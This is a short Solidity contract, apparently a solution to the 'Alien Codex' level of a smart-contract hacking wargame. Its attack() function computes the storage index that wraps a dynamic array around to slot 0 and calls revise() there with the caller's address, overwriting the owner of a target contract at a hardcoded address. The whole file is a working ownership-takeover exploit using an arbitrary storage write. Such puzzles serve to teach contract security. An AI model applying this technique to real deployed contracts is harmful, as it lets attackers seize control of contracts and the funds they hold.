// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;

interface IAlienCodex {
    function revise(uint256, bytes32) external;
}

contract AlienCodexHack {
    IAlienCodex public alienCodex = IAlienCodex(0x89BdDCaB01Fcc53e0D9fD4dc9CbFB8fD0f53D9B7);

    function attack() public {
        uint256 i = uint256(2) ** uint256(256) - uint256(keccak256(abi.encodePacked(uint256(1))));
        alienCodex.revise(i, bytes32(uint256(msg.sender)));
    }
}
